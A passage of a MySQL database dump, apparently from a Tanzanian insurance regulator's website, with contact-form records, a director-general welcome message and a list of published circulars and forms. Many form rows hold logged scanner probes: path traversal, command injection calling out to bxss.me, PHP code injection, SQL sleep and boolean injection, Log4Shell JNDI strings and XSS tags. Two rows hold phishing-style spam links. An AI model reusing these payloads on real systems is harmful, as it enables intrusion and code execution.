(173, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '../../../../../../../../../../../../../../windows/win.ini', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:31', '2022-08-11 10:38:31', 'sample@email.tst'),
(174, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', ';(nslookup hitxmjngbhobj05e0d.bxss.me||perl -e \"gethostbyname(\'hitxmjngbhobj05e0d.bxss.me\')\")|(nslookup hitxmjngbhobj05e0d.bxss.me||perl -e \"gethostbyname(\'hitxmjngbhobj05e0d.bxss.me\')\")&(nslookup hitxmjngbhobj05e0d.bxss.me||perl -e \"gethostbyname(\'hitxmjngbhobj05e0d.bxss.me\')\")', '', '', '0000-00-00', 0, '2022-08-11 10:38:31', '2022-08-11 10:38:31', 'sample@email.tst'),
(175, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, 'complaints', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:32', '2022-08-11 10:38:32', 'sample@email.tst'),
(176, 'ncMUFCMU', '', '', '', '', ';assert(base64_decode(\'cHJpbnQobWQ1KDMxMzM3KSk7\'));', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:32', '2022-08-11 10:38:32', 'sample@email.tst'),
(177, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:32', '2022-08-11 10:38:32', 'sample@email.tst'),
(178, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:32', '2022-08-11 10:38:32', 'sample@email.tst'),
(179, 'ncMUFCMU', '', '', '', '', 'echo uxdxit$()\\ eshcpi\\nz^xyu||a #\' &echo uxdxit$()\\ eshcpi\\nz^xyu||a #|\" &echo uxdxit$()\\ eshcpi\\nz^xyu||a #', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:32', '2022-08-11 10:38:32', 'sample@email.tst'),
(180, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, 'complaints/.', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:33', '2022-08-11 10:38:33', 'sample@email.tst'),
(181, 'ncMUFCMU', '', '', '', '', '\';print(md5(31337));$a=\'', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:33', '2022-08-11 10:38:33', 'sample@email.tst'),
(182, 'dZcStdMA', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:33', '2022-08-11 10:38:33', 'sample@email.tst'),
(183, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '../1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:33', '2022-08-11 10:38:33', 'sample@email.tst'),
(184, 'ncMUFCMU', '', '', '', '', '&echo idpkbw$()\\ hvyhni\\nz^xyu||a #\' &echo idpkbw$()\\ hvyhni\\nz^xyu||a #|\" &echo idpkbw$()\\ hvyhni\\nz^xyu||a #', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:33', '2022-08-11 10:38:33', 'sample@email.tst'),
(185, 'ncMUFCMU', '', '', '', '', '\";print(md5(31337));$a=\"', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:34', '2022-08-11 10:38:34', 'sample@email.tst'),
(186, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-06069118593', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:34', '2022-08-11 10:38:34', 'sample@email.tst'),
(187, '-1 OR 2+618-618-1=0+0+0+1 --', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:34', '2022-08-11 10:38:34', 'sample@email.tst'),
(188, 'ncMUFCMU', '', '', '', '', '|echo xuavry$()\\ ptqzke\\nz^xyu||a #\' |echo xuavry$()\\ ptqzke\\nz^xyu||a #|\" |echo xuavry$()\\ ptqzke\\nz^xyu||a #', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:35', '2022-08-11 10:38:35', 'sample@email.tst'),
(189, 'ncMUFCMU', '', '', '', '', '${@print(md5(31337))}', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:35', '2022-08-11 10:38:35', 'sample@email.tst'),
(190, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '${j${::-n}di:dns${::-:}//hitgnhkcirimeb497d${::-.}bxss.me}zzzz', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:35', '2022-08-11 10:38:35', 'sample@email.tst'),
(191, '-1 OR 2+740-740-1=0+0+0+1', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:35', '2022-08-11 10:38:35', 'sample@email.tst'),
(192, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1\'\"()&%<acx><ScRiPt >bc6k(9866)</ScRiPt>', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:36', '2022-08-11 10:38:36', 'sample@email.tst'),
(193, 'ncMUFCMU', '', '', '', '', '(nslookup hitnyrijrbbim34c3f.bxss.me||perl -e \"gethostbyname(\'hitnyrijrbbim34c3f.bxss.me\')\")', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:36', '2022-08-11 10:38:36', 'sample@email.tst'),
(194, 'ncMUFCMU', '', '', '', '', '${@print(md5(31337))}\\', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:36', '2022-08-11 10:38:36', 'sample@email.tst'),
(195, '-1\' OR 2+402-402-1=0+0+0+1 --', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:36', '2022-08-11 10:38:36', 'sample@email.tst'),
(196, 'ncMUFCMU', '', '', '', '', '$(nslookup hitnmupmvwagn054b6.bxss.me||perl -e \"gethostbyname(\'hitnmupmvwagn054b6.bxss.me\')\")', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:37', '2022-08-11 10:38:37', 'sample@email.tst'),
(197, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '\'\"()&%<acx><ScRiPt >bc6k(9320)</ScRiPt>', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:37', '2022-08-11 10:38:37', 'sample@email.tst'),
(198, 'ncMUFCMU', '', '', '', '', '\'.print(md5(31337)).\'', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:37', '2022-08-11 10:38:37', 'sample@email.tst'),
(199, '-1\' OR 2+715-715-1=0+0+0+1 or \'3u8sMsUe\'=\'', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:37', '2022-08-11 10:38:37', 'sample@email.tst'),
(200, 'ncMUFCMU', '', '', '', '', '|(nslookup hituywfpdgcmnd52f4.bxss.me||perl -e \"gethostbyname(\'hituywfpdgcmnd52f4.bxss.me\')\")', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:38', '2022-08-11 10:38:38', 'sample@email.tst'),
(201, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '19683752', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:38', '2022-08-11 10:38:38', 'sample@email.tst'),
(202, 'ncMUFCMU', '', '', '', '', '1', NULL, '\';print(md5(31337));$a=\'', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:38', '2022-08-11 10:38:38', 'sample@email.tst'),
(203, '-1\" OR 2+383-383-1=0+0+0+1 --', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:38', '2022-08-11 10:38:38', 'sample@email.tst'),
(204, 'ncMUFCMU', '', '', '', '', '`(nslookup hitrcacojhckv6fce0.bxss.me||perl -e \"gethostbyname(\'hitrcacojhckv6fce0.bxss.me\')\")`', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:39', '2022-08-11 10:38:39', 'sample@email.tst'),
(205, 'ncMUFCMU', '', '', '', '', '1', NULL, '\";print(md5(31337));$a=\"', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:39', '2022-08-11 10:38:39', 'sample@email.tst'),
(206, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '${${:::::::::::::::::-j}ndi:dns${:::::::::::::::::-:}//dns.log4j..-3968..1b7ec${::-.}1${::-.}bxss.me}}', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:40', '2022-08-11 10:38:40', 'sample@email.tst'),
(207, 'ncMUFCMU', '', '', '', '', '1', NULL, '${@print(md5(31337))}', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:40', '2022-08-11 10:38:40', 'sample@email.tst'),
(208, 'ncMUFCMU', '', '', '', '', '1', NULL, '${@print(md5(31337))}\\', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:41', '2022-08-11 10:38:41', 'sample@email.tst'),
(209, 'if(now()=sysdate(),sleep(15),0)', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:41', '2022-08-11 10:38:41', 'sample@email.tst'),
(210, 'ncMUFCMU', '', '', '', '', '1', NULL, '\'.print(md5(31337)).\'', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:42', '2022-08-11 10:38:42', 'sample@email.tst'),
(211, '0\'XOR(if(now()=sysdate(),sleep(15),0))XOR\'Z', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:42', '2022-08-11 10:38:42', 'sample@email.tst'),
(212, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, 'echo ngzmlr$()\\ lfnqop\\nz^xyu||a #\' &echo ngzmlr$()\\ lfnqop\\nz^xyu||a #|\" &echo ngzmlr$()\\ lfnqop\\nz^xyu||a #', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:42', '2022-08-11 10:38:42', 'sample@email.tst'),
(213, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, ';assert(base64_decode(\'cHJpbnQobWQ1KDMxMzM3KSk7\'));', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:43', '2022-08-11 10:38:43', 'sample@email.tst'),
(214, '0\"XOR(if(now()=sysdate(),sleep(15),0))XOR\"Z', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:43', '2022-08-11 10:38:43', 'sample@email.tst'),
(215, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '&echo zkfqcy$()\\ wuolnh\\nz^xyu||a #\' &echo zkfqcy$()\\ wuolnh\\nz^xyu||a #|\" &echo zkfqcy$()\\ wuolnh\\nz^xyu||a #', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:43', '2022-08-11 10:38:43', 'sample@email.tst'),
(216, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '\';print(md5(31337));$a=\'', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:44', '2022-08-11 10:38:44', 'sample@email.tst'),
(217, '(select(0)from(select(sleep(15)))v)/*\'+(select(0)from(select(sleep(15)))v)+\'\"+(select(0)from(select(sleep(15)))v)+\"*/', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:44', '2022-08-11 10:38:44', 'sample@email.tst'),
(218, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '|echo smxado$()\\ gjtxfs\\nz^xyu||a #\' |echo smxado$()\\ gjtxfs\\nz^xyu||a #|\" |echo smxado$()\\ gjtxfs\\nz^xyu||a #', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:44', '2022-08-11 10:38:44', 'sample@email.tst'),
(219, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1\'\"', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:58', '2022-08-11 10:38:58', 'sample@email.tst'),
(220, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1\0', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:59', '2022-08-11 10:38:59', 'sample@email.tst'),
(221, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '@@7sD5V', '555', '', '', '0000-00-00', 0, '2022-08-11 10:39:00', '2022-08-11 10:39:00', 'sample@email.tst'),
(222, 'AlareGZ', '', '', '', '', 'Alare', NULL, '88584311563', '', 'Internal', 0, 0, 'I promised.', 'Hi, this is Jeniffer. I am sending you my intimate photos as I promised. https://tinyurl.com/2fv8c9cn', '', '', '0000-00-00', 0, '2022-08-15 10:55:37', '2022-08-15 10:55:37', '4i7j3nlk@hotmail.com'),
(223, 'AlareGZ', '', '', '', '', 'Alare', NULL, '83576792882', '', 'Internal', 0, 0, 'I promised.', 'Hi, this is Anna. I am sending you my intimate photos as I promised. https://tinyurl.com/2ogp7vx7', '', '', '0000-00-00', 0, '2022-08-15 17:57:13', '2022-08-15 17:57:13', 'f92ie22a@gmail.com');

-- --------------------------------------------------------

--
-- Table structure for table `dg_messages`
--

CREATE TABLE `dg_messages` (
  `id` int(11) NOT NULL,
  `summary_en` text DEFAULT NULL,
  `summary_sw` text DEFAULT NULL,
  `content_sw` text DEFAULT NULL,
  `content_en` text DEFAULT NULL,
  `status` int(11) NOT NULL DEFAULT 1,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp(),
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `dg_messages`
--

INSERT INTO `dg_messages` (`id`, `summary_en`, `summary_sw`, `content_sw`, `content_en`, `status`, `created_at`, `updated_at`) VALUES
(2, NULL, NULL, '<p>Dear Viewers of TIRA Website,</p>\r\n\r\n<p>Welcome once again and thank you for visiting to our website <a href=\"http://www.tira.go.tz\">www.tira.go.tz</a> in order to get updated on various information in regard to insurance services in Tanzania. The Authority is dedicated to provide information on insurance and related matters.</p>\r\n\r\n<p>Recently, we have refine-tuned our supervisory system &lsquo;TIRA &ndash; MIS&rsquo; purposely for accommodating more services than motor insurance verification. With enhanced capacity and well-integrated, the system will now keep insurance data, validate motor insurance and other properties (as a new feature), allow submission of complaints electronically (e-complaints) and complete elimination of paper stickers instead using electronic stickers (e-stickers), provide quick and quality services as well as other industry supervision parameters.</p>\r\n\r\n<p>Therefore, motor insurance customers will not be provided with paper stickers by insurance service providers, they will be provided with: insurance cover note, insurance policy and EFD receipt. On the other hand, the TIRA-MIS is integrated with other supervisory systems of Government institutions like Tanzania Police Force, Tanzania Revenue Authority (TIRA), Zanzibar Business and Property Registration Agency (ZBPRA), Business Registration and Licensing Agency (BRELA), National Identification Authority (NIDA) and other regulating bodies in Tanzania Main Land and in the Isles.</p>\r\n\r\n<p>The Authority will continue to renovate the system in order to accommodate customer needs and good serves. We wish to assure insurance customers and the public in general: the accuracy, stability, availability and user friendly of the system.&nbsp; In case of any inconvenience do not hesitate to commutate with us through our addresses on the contact line.</p>\r\n\r\n<p>Thank you</p>', '<p>Dear Viewers of TIRA Website,</p>\r\n\r\n<p>Welcome once again and thank you for visiting to our website <a href=\"http://www.tira.go.tz\">www.tira.go.tz</a> in order to get updated on various information in regard to insurance services in Tanzania. The Authority is dedicated to provide information on insurance and related matters.</p>\r\n\r\n<p>Recently, we have refine-tuned our supervisory system &lsquo;TIRA &ndash; MIS&rsquo; purposely for accommodating more services than motor insurance verification. With enhanced capacity and well-integrated, the system will now keep insurance data, validate motor insurance and other properties (as a new feature), allow submission of complaints electronically (e-complaints) and complete elimination of paper stickers instead using electronic stickers (e-stickers), provide quick and quality services as well as other industry supervision parameters.</p>\r\n\r\n<p>Therefore, motor insurance customers will not be provided with paper stickers by insurance service providers, they will be provided with: insurance cover note, insurance policy and EFD receipt. On the other hand, the TIRA-MIS is integrated with other supervisory systems of Government institutions like Tanzania Police Force, Tanzania Revenue Authority (TIRA), Zanzibar Business and Property Registration Agency (ZBPRA), Business Registration and Licensing Agency (BRELA), National Identification Authority (NIDA) and other regulating bodies in Tanzania Main Land and in the Isles.</p>\r\n\r\n<p>The Authority will continue to renovate the system in order to accommodate customer needs and good serves. We wish to assure insurance customers and the public in general: the accuracy, stability, availability and user friendly of the system.&nbsp; In case of any inconvenience do not hesitate to commutate with us through our addresses on the contact line.</p>\r\n\r\n<p>Thank you</p>', 1, '2022-08-12 11:52:51', '2022-08-12 08:52:51');

-- --------------------------------------------------------

--
-- Table structure for table `documents`
--

CREATE TABLE `documents` (
  `id` int(10) UNSIGNED NOT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `file_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `file_en` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `featured` tinyint(1) DEFAULT 0,
  `active` tinyint(1) NOT NULL,
  `published_date` date NOT NULL,
  `category_id` int(10) UNSIGNED NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `documents`
--

INSERT INTO `documents` (`id`, `title_sw`, `title_en`, `file_sw`, `file_en`, `featured`, `active`, `published_date`, `category_id`, `created_at`, `updated_at`) VALUES
(4, 'New Guide', 'Guide Mpya', 'sw-1656615782-SKILLS FOR  JOB (1).pdf', 'en-1656615782-SKILLS FOR  JOB (1).doc', 0, 1, '2022-06-14', 5, '2022-06-30 16:03:02', '2022-06-30 16:03:02'),
(11, 'CIRCULAR NO. 102/2021 TO ALL BANCASSURANCE AGENCIES', 'CIRCULAR NO. 102/2021 TO ALL BANCASSURANCE AGENCIES', 'sw-1660210900-A CIRCULAR TO ALL BANCASSURANCE AGENCIES FILING.pdf', 'en-1660210900-A CIRCULAR TO ALL BANCASSURANCE AGENCIES FILING.pdf', 0, 1, '2022-08-11', 12, '2022-08-11 06:41:40', '2022-08-11 06:41:40'),
(12, 'CIRCULAR NO. 101/2021 TO ALL INSURANCE ACTUARIES', 'CIRCULAR NO. 101/2021 TO ALL INSURANCE ACTUARIES', 'sw-1660293158-A CIRCULAR TO ALL INSURANCE  ACTUARIES.pdf', 'en-1660293158-A CIRCULAR TO ALL INSURANCE  ACTUARIES.pdf', 0, 1, '2022-08-12', 12, '2022-08-12 05:32:38', '2022-08-12 05:32:38'),
(13, 'Guidelines on the Implementation of IFRS 17, 2022', 'Guidelines on the Implementation of IFRS 17, 2022', 'sw-1660294599-Guidelines on the Implementation of IFRS 17, 2022.pdf', 'en-1660294599-Guidelines on the Implementation of IFRS 17, 2022.pdf', 0, 1, '2022-08-12', 8, '2022-08-12 05:56:39', '2022-08-12 05:56:39'),
(14, 'MWONGOZO YA MAAFISA WAUZA BIMA', 'MWONGOZO YA MAAFISA WAUZA BIMA', 'sw-1660294723-MWONGOZO YA MAAFISA WAUZA BIMA.pdf', 'en-1660294723-MWONGOZO YA MAAFISA WAUZA BIMA.pdf', 0, 1, '2022-08-12', 8, '2022-08-12 05:58:43', '2022-08-12 05:58:43'),
(15, 'MWONGOZO WA UTOAJI HUDUMA ZA BIMA KIDIJITALI', 'MWONGOZO WA UTOAJI HUDUMA ZA BIMA KIDIJITALI', 'sw-1660294935-MWONGOZO WA UTOAJI HUDUMA ZA BIMA KIDIJITALI.pdf', 'en-1660294935-MWONGOZO WA UTOAJI HUDUMA ZA BIMA KIDIJITALI.pdf', 0, 1, '2022-08-12', 8, '2022-08-12 06:02:15', '2022-08-12 06:02:15'),
(16, 'MWONGOZO WA UENDESHAJI WA TAKAFUL', 'MWONGOZO WA UENDESHAJI WA TAKAFUL', 'sw-1660295080-MWONGOZO WA UENDESHAJI WA TAKAFUL _0.pdf', 'en-1660295080-MWONGOZO WA UENDESHAJI WA TAKAFUL _0.pdf', 0, 1, '2022-08-12', 8, '2022-08-12 06:04:40', '2022-08-12 06:04:40'),
(17, 'G N INSURANCE REGULATIONS-2009 Final', 'G N INSURANCE REGULATIONS-2009 Final', 'sw-1660295576-Insurance Regulations of 2009.pdf', 'en-1660295576-Insurance Regulations of 2009.pdf', 0, 1, '2022-08-12', 7, '2022-08-12 06:12:56', '2022-08-12 06:12:56'),
(19, 'Insurance Act', 'Insurance Act', 'sw-1660295855-Insurance Act No 10 of 2009.pdf', 'en-1660295855-Insurance Act No 10 of 2009.pdf', 0, 1, '2022-08-12', 15, '2022-08-12 06:17:35', '2022-08-12 06:17:35'),
(20, 'Micro Insurance Regulations', 'Micro Insurance Regulations', 'sw-1660297131-Micro_Insurance-Regulations_2013.pdf', 'en-1660297131-Micro_Insurance-Regulations_2013.pdf', 0, 1, '2022-08-12', 17, '2022-08-12 06:38:51', '2022-08-12 06:38:51'),
(21, 'Micro Insurance Regulations', 'Micro Insurance Regulations', 'sw-1660297233-Micro_Insurance-Regulations_2013.pdf', 'en-1660297233-Insurance Regulations of 2009.pdf', 0, 1, '2022-08-12', 7, '2022-08-12 06:40:33', '2022-08-12 06:40:33'),
(22, 'REQUIREMENTS FOR LICENSING INSURANCE COMPANY FOR THE YEAR 2021', 'REQUIREMENTS FOR LICENSING INSURANCE COMPANY FOR THE YEAR 2021', 'sw-1660298364-CHECKLIST FOR LICENSING INSURANCE COMPANY.pdf', 'en-1660298364-CHECKLIST FOR LICENSING INSURANCE COMPANY.pdf', 0, 1, '2022-08-12', 9, '2022-08-12 06:59:24', '2022-08-12 06:59:24'),
(23, 'FORM B FOR INSURERS & REINSURES FOR RENEWAL 2020', 'FORM B FOR INSURERS & REINSURES FOR RENEWAL 2020', 'sw-1660372598-FORM B FOR INSURERS &  REINSURES FOR RENEWAL 2020 (2).xlsx', 'en-1660372598-FORM B FOR INSURERS &  REINSURES FOR RENEWAL 2020 (2).xlsx', 0, 1, '2022-08-12', 9, '2022-08-13 03:36:38', '2022-08-13 03:36:38'),
(24, 'APPLICATION FORM NO 1- Insurance Company_Reinsurers', 'APPLICATION FORM NO 1- Insurance Company_Reinsurers', 'sw-1660372741-APPLICATION FORM NO 1- Insurance Company_Reinsurers.pdf', 'en-1660372741-APPLICATION FORM NO 1- Insurance Company_Reinsurers.pdf', 0, 1, '2022-08-12', 9, '2022-08-13 03:39:01', '2022-08-13 03:39:01'),
(25, 'REQUIREMENTS FOR REGISTRATION AS AN INSURANCE COMPANY', 'REQUIREMENTS FOR REGISTRATION AS AN INSURANCE COMPANY', 'sw-1660372875-REGISTRATION REQUIREMENTS 2018 -INSURANCE COMPANY.pdf', 'en-1660372875-REGISTRATION REQUIREMENTS 2018 -INSURANCE COMPANY.pdf', 0, 1, '2022-08-12', 9, '2022-08-13 03:41:15', '2022-08-13 03:41:15'),
(26, 'REQUIREMENTS FOR LICENSING BANCASSURANCE AGENT', 'REQUIREMENTS FOR LICENSING BANCASSURANCE AGENT', 'sw-1660401376-REQUIREMENTS FOR LICENSING BANCASSURANCE AGENT.pdf', 'en-1660401376-REQUIREMENTS FOR LICENSING BANCASSURANCE AGENT.pdf', 0, 1, '2022-08-12', 22, '2022-08-13 11:36:16', '2022-08-13 11:36:16'),
(27, 'REQUIREMENTS FOR LICENSING BANCASSURANCE AGENT', 'REQUIREMENTS FOR LICENSING BANCASSURANCE AGENT', 'sw-1660401510-Questionaires_Bancassurance.pdf', 'en-1660401510-Questionaires_Bancassurance.pdf', 0, 1, '2022-08-12', 22, '2022-08-13 11:38:30', '2022-08-13 11:38:30'),
(28, 'CHECKLIST BANCASSURANCE AGENT', 'CHECKLIST BANCASSURANCE AGENT', 'sw-1660401607-Checklist_Bancassurance Agent_0.pdf', 'en-1660401607-Checklist_Bancassurance Agent_0.pdf', 0, 1, '2022-08-12', 22, '2022-08-13 11:40:07', '2022-08-13 11:40:07'),
(29, 'CHECKLIST BANCASSURANCE AGENT', 'CHECKLIST BANCASSURANCE AGENT', 'sw-1660401707-Checklist_Bancassurance Agent.pdf', 'en-1660401707-Checklist_Bancassurance Agent.pdf', 0, 1, '2022-08-12', 22, '2022-08-13 11:41:47', '2022-08-13 11:41:47'),
(30, 'BANCASSURANCE AGENTS FEES', 'BANCASSURANCE AGENTS FEES', 'sw-1660401781-Bancassurance Agents_FEES_0.pdf', 'en-1660401781-Bancassurance Agents_FEES_0.pdf', 0, 1, '2022-08-12', 22, '2022-08-13 11:43:01', '2022-08-13 11:43:01'),
(31, 'APPLICATION FORM BANCASSURANCE AGENT', 'APPLICATION FORM BANCASSURANCE AGENT', 'sw-1660401952-Application Form_Bancassurance Agent_0.pdf', 'en-1660401952-Application Form_Bancassurance Agent_0.pdf', 0, 1, '2022-08-12', 22, '2022-08-13 11:45:52', '2022-08-13 11:45:52'),
(32, 'APPLICATION FORM no 3(b)-Insurance Agents_Assessors_Loss adjusters_Private Investigators_Surveyors', 'APPLICATION FORM no 3(b)-Insurance Agents_Assessors_Loss adjusters_Private Investigators_Surveyors', 'sw-1660402306-APPLICATION FORM  no  3(b)-Insurance Agents_Assessors_Loss adjusters_Private Investigators_Surveyors.pdf', 'en-1660402306-APPLICATION FORM  no  3(b)-Insurance Agents_Assessors_Loss adjusters_Private Investigators_Surveyors.pdf', 0, 1, '2022-08-12', 22, '2022-08-13 11:51:46', '2022-08-13 11:51:46'),
(33, 'REQUIREMENTS OF REGISTRATION AS AN INSURANCE AGENT|ADJUSTER|INVESTIGATOR.-2018', 'REQUIREMENTS OF REGISTRATION AS AN INSURANCE AGENT|ADJUSTER|INVESTIGATOR.-2018', 'sw-1660402634-REGISTRATION REQUIREMENTS 2018 -INSURANCE AGENCY_ADJUSTER_INVESTIGATOR.pdf', 'en-1660402634-REGISTRATION REQUIREMENTS 2018 -INSURANCE AGENCY_ADJUSTER_INVESTIGATOR.pdf', 0, 1, '2022-08-12', 22, '2022-08-13 11:57:14', '2022-08-13 11:57:14'),
(34, 'REQUIREMENTS FOR LICENSING INSURANCE ACTUARY', 'REQUIREMENTS FOR LICENSING INSURANCE ACTUARY', 'sw-1660402832-REQUIREMENTS FOR LICENSING INSURANCE ACTUARY.pdf', 'en-1660402832-REQUIREMENTS FOR LICENSING INSURANCE ACTUARY.pdf', 0, 1, '2022-08-12', 22, '2022-08-13 12:00:32', '2022-08-13 12:00:32'),
(35, 'TEMPLATE FOR COMPUTATION OF BROKERS CAPITAL FOR YEAR 2020', 'TEMPLATE FOR COMPUTATION OF BROKERS CAPITAL FOR YEAR 2020', 'sw-1660403926-TEMPLATE FOR COMPUTATION OF BROKERS CAPITAL FOR YEAR 2020_0 (1).xlsx', 'en-1660403926-TEMPLATE FOR COMPUTATION OF BROKERS CAPITAL FOR YEAR 2020_0 (1).xlsx', 0, 1, '2022-08-12', 10, '2022-08-13 12:18:46', '2022-08-13 12:18:46'),
(36, 'ANNEXURE', 'ANNEXURE', 'sw-1660404161-ANNEXURE 1_FINAL.XLSX', 'en-1660404161-ANNEXURE 1_FINAL.XLSX', 0, 1, '2022-08-12', 20, '2022-08-13 12:22:41', '2022-08-13 12:22:41'),
(37, 'Application Form Accreditation of Reinsurer', 'Application Form Accreditation of Reinsurer', 'sw-1660404817-APPLICATION FORM FORM_ACCREDITATION_REINSURER.PDF', 'en-1660404817-APPLICATION FORM FORM_ACCREDITATION_REINSURER.PDF', 0, 1, '2022-08-12', 20, '2022-08-13 12:33:37', '2022-08-13 12:33:37'),
(38, 'Application Form for Accreditation of Broker', 'Application Form for Accreditation of Broker', 'sw-1660405354-APPLICATION FORM FORM_ACCREDITATION_BROKER.PDF', 'en-1660405354-APPLICATION FORM FORM_ACCREDITATION_BROKER.PDF', 0, 1, '2022-08-12', 21, '2022-08-13 12:42:34', '2022-08-13 12:42:34');

-- --------------------------------------------------------

--
-- Table structure for table `document_categories`
--

CREATE TABLE `document_categories` (
  `id` int(10) UNSIGNED NOT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
